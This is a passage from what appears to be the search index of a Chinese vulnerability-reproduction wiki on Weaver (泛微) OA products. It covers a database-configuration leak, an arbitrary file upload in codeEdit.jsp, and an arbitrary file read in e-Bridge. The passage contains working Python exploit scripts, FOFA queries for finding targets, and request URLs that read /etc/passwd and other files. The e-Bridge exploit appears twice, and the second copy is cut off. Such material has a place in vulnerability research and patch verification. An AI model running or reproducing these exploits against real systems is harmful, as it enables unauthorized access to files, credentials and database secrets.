: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36' , 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' , } r1 = requests . get ( url , headers = headers ) . content s = r1 . replace ( ' \\r\\n ' , '' ) res1 = base64 . b64encode ( s ) postdata = { 'data' : res1 , 'type' : 'des' , 'arg' : 'm=ecb_pad=zero_p=1z2x3c4v_o=0_s=gb2312_t=1' } u = 'http://tool.chacuo.net/cryptdes' r2 = requests . post ( u , data = postdata , headers = headers ) . content res2 = ast . literal_eval ( r2 ) return res2 [ 'data' ] url = 'http://xxx.xxx.xxx.xxx:8888//mobile/DBconfigReader.jsp' print req ( url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20e-cology%20%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/#\u53c2\u8003\u6587\u7ae0","text":"[\u66f4\u65b0]\u6cdb\u5faee-cology OA\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e\u9884\u8b66","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20sysinterfacecodeEdit.jsp%20%E9%A1%B5%E9%9D%A2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","text":"\u6cdb\u5faeOA sysinterface/codeEdit.jsp \u9875\u9762\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 WooYun-2015-0155705 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u6cdb\u5faeOA sysinterface/codeEdit.jsp \u9875\u9762\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u5bfc\u81f4\u53ef\u4ee5\u4e0a\u4f20\u6076\u610f\u6587\u4ef6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 [!NOTE] \u8f83\u8001\u7248\u672c\uff0c\u76ee\u524d\u65e0\u51c6\u786e\u7248\u672c \u6f0f\u6d1e\u590d\u73b0 \u00b6 filename=******5308.java&filetype=javafilename\u4e3a\u6587\u4ef6\u540d\u79f0 \u4e3a\u7a7a\u65f6\u4f1a\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a String fileid = \"Ewv\" ; < br > String readonly = \"\" ; < br > boolean isCreate = false ; < br > if ( StringHelper . isEmpty ( fileName )) { < br > Date ndate = new Date (); < br > SimpleDateFormat sf = new SimpleDateFormat ( \"yyyyMMddHHmmss\" ); < br > String datetime = sf . format ( ndate ); < br > fileid = fileid + datetime ; < br > fileName = fileid + \".\" + filetype ; < br > isCreate = true ; < br > } else { < br > int pointIndex = fileName . indexOf ( \".\" ); < br > if ( pointIndex > - 1 ) { < br > fileid = fileName . substring ( 0 , pointIndex ); < br > }} \u53c2\u8003\u6587\u7ae0 \u00b6 \u6cdb\u5faeOA\u672a\u6388\u6743\u53ef\u5bfc\u81f4GetShell","title":"\u6cdb\u5faeOA sysinterfacecodeEdit.jsp \u9875\u9762\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20sysinterfacecodeEdit.jsp%20%E9%A1%B5%E9%9D%A2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6cdb\u5faeoa-sysinterfacecodeeditjsp-\u9875\u9762\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20-wooyun-2015-0155705","text":"","title":"\u6cdb\u5faeOA sysinterface/codeEdit.jsp \u9875\u9762\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 WooYun-2015-0155705"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20sysinterfacecodeEdit.jsp%20%E9%A1%B5%E9%9D%A2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u6cdb\u5faeOA sysinterface/codeEdit.jsp \u9875\u9762\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u5bfc\u81f4\u53ef\u4ee5\u4e0a\u4f20\u6076\u610f\u6587\u4ef6","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20sysinterfacecodeEdit.jsp%20%E9%A1%B5%E9%9D%A2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6f0f\u6d1e\u63cf\u8ff0_1","text":"[!NOTE] \u8f83\u8001\u7248\u672c\uff0c\u76ee\u524d\u65e0\u51c6\u786e\u7248\u672c","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20sysinterfacecodeEdit.jsp%20%E9%A1%B5%E9%9D%A2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u6f0f\u6d1e\u590d\u73b0","text":"filename=******5308.java&filetype=javafilename\u4e3a\u6587\u4ef6\u540d\u79f0 \u4e3a\u7a7a\u65f6\u4f1a\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a String fileid = \"Ewv\" ; < br > String readonly = \"\" ; < br > boolean isCreate = false ; < br > if ( StringHelper . isEmpty ( fileName )) { < br > Date ndate = new Date (); < br > SimpleDateFormat sf = new SimpleDateFormat ( \"yyyyMMddHHmmss\" ); < br > String datetime = sf . format ( ndate ); < br > fileid = fileid + datetime ; < br > fileName = fileid + \".\" + filetype ; < br > isCreate = true ; < br > } else { < br > int pointIndex = fileName . indexOf ( \".\" ); < br > if ( pointIndex > - 1 ) { < br > fileid = fileName . substring ( 0 , pointIndex ); < br > }}","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20sysinterfacecodeEdit.jsp%20%E9%A1%B5%E9%9D%A2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#\u53c2\u8003\u6587\u7ae0","text":"\u6cdb\u5faeOA\u672a\u6388\u6743\u53ef\u5bfc\u81f4GetShell","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%20e-Bridge%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","text":"\u6cdb\u5fae\u4e91\u6865 e-Bridge \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u6cdb\u5fae\u4e91\u6865\uff08e-Bridge\uff09\u662f\u4e0a\u6d77\u6cdb\u5fae\u516c\u53f8\u5728\u201d\u4e92\u8054\u7f51+\u201d\u7684\u80cc\u666f\u4e0b\u7814\u53d1\u7684\u4e00\u6b3e\u7528\u4e8e\u6865\u63a5\u4e92\u8054\u7f51\u5f00\u653e\u8d44\u6e90\u4e0e\u4f01\u4e1a\u4fe1\u606f\u5316\u7cfb\u7edf\u7684\u7cfb\u7edf\u96c6\u6210\u4e2d\u95f4\u4ef6\u3002\u6cdb\u5fae\u4e91\u6865\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u6210\u529f\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u53ef\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\uff0c\u83b7\u53d6\u654f\u611f\u4fe1\u606f\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] \u6cdb\u5fae\u4e91\u6865 e-Bridge 2018-2019 \u591a\u4e2a\u7248\u672c FOFA \u00b6 [!NOTE] title=\"\u6cdb\u5fae\u4e91\u6865e-Bridge\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 [!NOTE] \u5206\u4e3a\u4e24\u79cd\uff0c\u5206\u522b\u4e3a Windows \u548c Linux Windows \u00b6 \u8bbf\u95ee http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt \u6210\u529f\u8fd4\u56de id\u503c ,\u8bf4\u660e\u542b\u6709\u6b64\u6f0f\u6d1e \u8c03\u7528\u67e5\u770b\u6587\u4ef6\u63a5\u53e3\u8bbf\u95ee http://xxx.xxx.xxx.xxx/file/fileNoLogin/id\u503c Linux \u00b6 \u8bbf\u95ee http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt \u6210\u529f\u8fd4\u56de id\u503c ,\u8bf4\u660e\u542b\u6709\u6b64\u6f0f\u6d1e \u8c03\u7528\u67e5\u770b\u6587\u4ef6\u63a5\u53e3\u8bbf\u95ee http://xxx.xxx.xxx.xxx/file/fileNoLogin/id\u503c \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] \u6ce8\u610f\u8bfb\u53d6Linux\u7cfb\u7edf\u6587\u4ef6\u65f6\uff0c\u9700\u8981\u5b8c\u6574\u8def\u5f84 \u4f8b\u5982\u8bfb\u53d6\u6839\u76ee\u5f55\u4e0b\u7684 1.txt \u5e94\u4e3a /1.txt \u800c\u4e0d\u662f 1.txt #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u6cdb\u5fae\u4e91\u6865 e-Bridge \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) # \u5224\u65ad\u64cd\u4f5c\u7cfb\u7edf or \u5224\u65ad\u6f0f\u6d1e\u662f\u5426\u53ef\u5229\u7528 def POC_1 ( target_url ): vuln_url_1 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt\" vuln_url_2 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt\" vuln_url_3 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///&fileExt=txt\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } try : response_1 = requests . get ( url = vuln_url_1 , headers = headers , verify = False , timeout = 10 ) response_2 = requests . get ( url = vuln_url_2 , headers = headers , verify = False , timeout = 10 ) response_3 = requests . get ( url = vuln_url_3 , headers = headers , verify = False , timeout = 10 ) if \"\u65e0\u6cd5\u9a8c\u8bc1\u60a8\u7684\u8eab\u4efd\" in response_1 . text and \"\u65e0\u6cd5\u9a8c\u8bc1\u60a8\u7684\u8eab\u4efd\" in response_2 . text : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5df2\u4fee\u590d\uff0c\u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) else : if \"No such file or directory\" in response_1 . text : print ( \" \\033 [32m[o] \u76ee\u6807\u4e3a Linux \u7cfb\u7edf \\033 [0m\" ) id = re . findall ( r '\"id\":\"(.*?)\"' , response_3 . text )[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u53d6id\uff1a {} \\033 [0m\" . format ( id )) return id , \"linux\" elif \"\u7cfb\u7edf\u627e\u4e0d\u5230\u6307\u5b9a\u7684\u8def\u5f84\" in response_2 . text : print ( \" \\033 [32m[o] \u76ee\u6807\u4e3a Windows \u7cfb\u7edf \\033 [0m\" ) id = re . findall ( r '\"id\":\"(.*?)\"' , response_1 . text )[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u53d6id\uff1a {} \\033 [0m\" . format ( id )) return id , \"windows\" else : print ( \" \\033 [31m[x] \u65e0\u6cd5\u83b7\u53d6\u76ee\u6807\u7cfb\u7edf \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25: {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) # \u9a8c\u8bc1\u6f0f\u6d1e def POC_2 ( target_url , id ): file_url = target_url + \"/file/fileNoLogin/ {} \" . format ( id ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } try : response = requests . get ( url = file_url , headers = headers , verify = False , timeout = 10 ) response . encoding = 'GBK' print ( \" \\033 [32m[o] \u6210\u529f\u8bfb\u53d6\uff1a \\n\\033 [0m {} \" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25: {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) # windows \u6587\u4ef6\u8bfb\u53d6 def POC_3 ( target_url , File ): file_url = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/ {} &fileExt=txt\" . format ( File ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } try : response = requests . get ( url = file_url , headers = headers , verify = False , timeout = 10 ) id = re . findall ( r '\"id\":\"(.*?)\"' , response . text )[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u53d6id\uff1a {} \\033 [0m\" . format ( id )) POC_2 ( target_url , id ) except : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25\uff0c\u65e0\u6cd5\u8bfb\u53d6\u6587\u4ef6 \\033 [0m)\" ) # linux\u8bfb\u53d6\u6587\u4ef6 def POC_4 ( target_url , File ): file_url = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:// {} &fileExt=txt\" . format ( File ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } try : response = requests . get ( url = file_url , headers = headers , verify = False , timeout = 10 ) id = re . findall ( r '\"id\":\"(.*?)\"' , response . text )[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u53d6id\uff1a {} \\033 [0m\" . format ( id )) POC_2 ( target_url , id ) except : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25\uff0c\u65e0\u6cd5\u8bfb\u53d6\u6587\u4ef6 \\033 [0m)\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) id , system = POC_1 ( target_url ) POC_2 ( target_url , id ) while True : if system == \"windows\" : File = input ( \" \\033 [35mFile >>> \\033 [0m\" ) if File == \"exit\" : sys . exit ( 0 ) else : POC_3 ( target_url , File ) if system == \"linux\" : File = input ( \" \\033 [35mFile >>> \\033 [0m\" ) if File == \"exit\" : sys . exit ( 0 ) else : POC_4 ( target_url , File )","title":"\u6cdb\u5fae\u4e91\u6865 e-Bridge \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%20e-Bridge%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#\u6cdb\u5fae\u4e91\u6865-e-bridge-\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6","text":"","title":"\u6cdb\u5fae\u4e91\u6865 e-Bridge \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%20e-Bridge%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u6cdb\u5fae\u4e91\u6865\uff08e-Bridge\uff09\u662f\u4e0a\u6d77\u6cdb\u5fae\u516c\u53f8\u5728\u201d\u4e92\u8054\u7f51+\u201d\u7684\u80cc\u666f\u4e0b\u7814\u53d1\u7684\u4e00\u6b3e\u7528\u4e8e\u6865\u63a5\u4e92\u8054\u7f51\u5f00\u653e\u8d44\u6e90\u4e0e\u4f01\u4e1a\u4fe1\u606f\u5316\u7cfb\u7edf\u7684\u7cfb\u7edf\u96c6\u6210\u4e2d\u95f4\u4ef6\u3002\u6cdb\u5fae\u4e91\u6865\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u6210\u529f\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u53ef\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\uff0c\u83b7\u53d6\u654f\u611f\u4fe1\u606f\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%20e-Bridge%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] \u6cdb\u5fae\u4e91\u6865 e-Bridge 2018-2019 \u591a\u4e2a\u7248\u672c","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%20e-Bridge%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#fofa","text":"[!NOTE] title=\"\u6cdb\u5fae\u4e91\u6865e-Bridge\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%20e-Bridge%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#\u6f0f\u6d1e\u590d\u73b0","text":"[!NOTE] \u5206\u4e3a\u4e24\u79cd\uff0c\u5206\u522b\u4e3a Windows \u548c Linux","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%20e-Bridge%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#windows","text":"\u8bbf\u95ee http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt \u6210\u529f\u8fd4\u56de id\u503c ,\u8bf4\u660e\u542b\u6709\u6b64\u6f0f\u6d1e \u8c03\u7528\u67e5\u770b\u6587\u4ef6\u63a5\u53e3\u8bbf\u95ee http://xxx.xxx.xxx.xxx/file/fileNoLogin/id\u503c","title":"Windows"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%20e-Bridge%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#linux","text":"\u8bbf\u95ee http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt \u6210\u529f\u8fd4\u56de id\u503c ,\u8bf4\u660e\u542b\u6709\u6b64\u6f0f\u6d1e \u8c03\u7528\u67e5\u770b\u6587\u4ef6\u63a5\u53e3\u8bbf\u95ee http://xxx.xxx.xxx.xxx/file/fileNoLogin/id\u503c","title":"Linux"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%20e-Bridge%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] \u6ce8\u610f\u8bfb\u53d6Linux\u7cfb\u7edf\u6587\u4ef6\u65f6\uff0c\u9700\u8981\u5b8c\u6574\u8def\u5f84 \u4f8b\u5982\u8bfb\u53d6\u6839\u76ee\u5f55\u4e0b\u7684 1.txt \u5e94\u4e3a /1.txt \u800c\u4e0d\u662f 1.txt #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u6cdb\u5fae\u4e91\u6865 e-Bridge \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) # \u5224\u65ad\u64cd\u4f5c\u7cfb\u7edf or \u5224\u65ad\u6f0f\u6d1e\u662f\u5426\u53ef\u5229\u7528 def POC_1 ( target_url ): vuln_url_1 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt\" vuln_url_2 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt\" vuln_url_3 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///&fileExt=txt\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } try : response_1 = requests . get ( url = vuln_url_1 , headers = headers , verify = False , timeout = 10 ) response_2 = requests . get ( url = vuln_url_2 , headers = headers , verify = False , timeout = 10 ) response_3 = requests . get ( url = vuln_url_3 , headers = headers , verify = False , timeout = 10 ) if \"\u65e0\u6cd5\u9a8c\u8bc1\u60a8\u7684\u8eab\u4efd\" in response_1 . text and \"\u65e0\u6cd5\u9a8c\u8bc1\u60a8\u7684\u8eab\u4efd\" in response_2 . text : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5df2\u4fee\u590d\uff0c\u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) else : if \"No such file or directory\" in response_1 . text : print ( \" \\033 [32m[o] \u76ee\u6807\u4e3a Linux \u7cfb\u7edf \\033 [0m\" ) id = re . findall ( r '\"id\":\"(.*?)\"' , response_3 . text )[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u53d6id\uff1a {} \\033 [0m\" . format ( id )) return id , \"linux\" elif \"\u7cfb\u7edf\u627e\u4e0d\u5230\u6307\u5b9a\u7684\u8def\u5f84\" in response_2 . text : print ( \" \\033 [32m[o] \u76ee\u6807\u4e3a Windows \u7cfb\u7edf \\033 [0m\" ) id = re . findall ( r '\"id\":\"(.*?)\"' , response_1 . text )[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u53d6id\uff1a {} \\033 [0m\" . format ( id )) return id , \"windows\" else : print ( \" \\033 [31m[x] \u65e0\u6cd5\u83b7\u53d6\u76ee\u6807\u7cfb\u7edf \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25: {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) # \u9a8c\u8bc1\u6f0f\u6d1e def POC_2 ( target_url , id ): file_url = target_url + \"/file/fileNoLogin/ {} \" . format ( id ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } try : response = requests . get ( url = file_url , headers = headers , verify = False , timeout = 10 ) response . encoding = 'GBK' print ( \" \\033 [32m[o] \u6210\u529f\u8bfb\u53d6\uff1a \\n\\033 [0m {} \" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25: {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) # windows \u6587\u4ef6\u8bfb\u53d6 def POC_3 ( target_url , File ): file_url = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/ {} &fileExt=txt\" . format ( File ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } try : response = requests . get ( url = file_url , headers = headers , verify = False , timeout = 10 ) id = re . findall ( r '\"id\":\"(.*?)\"' , response . text )[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u53d6id\uff1a {} \\033 [0m\" . format ( id )) POC_2 ( target_url , id ) except : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25\uff0c\u65e0\u6cd5\u8bfb\u53d6\u6587\u4ef6 \\033 [0m)\" ) # linux\u8bfb\u53d6\u6587\u4ef6 def POC_4 ( target_url , File ): file_url = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:// {} &fileExt=txt\" . format ( File ) headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } try : response = requests . get ( url = file_url , headers = headers , verify = False , timeout = 10 ) id = re . findall ( r '\"id\":\"(.*?)\"' , response . text )[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u53d6id\uff1a {} \\033 [0m\" . format ( id )) POC_2 ( target_url , id ) except : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25\uff0c\u65e0\u6cd5\u8bfb\u53d6\u6587\u4ef6 \\033 [0m)\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) id 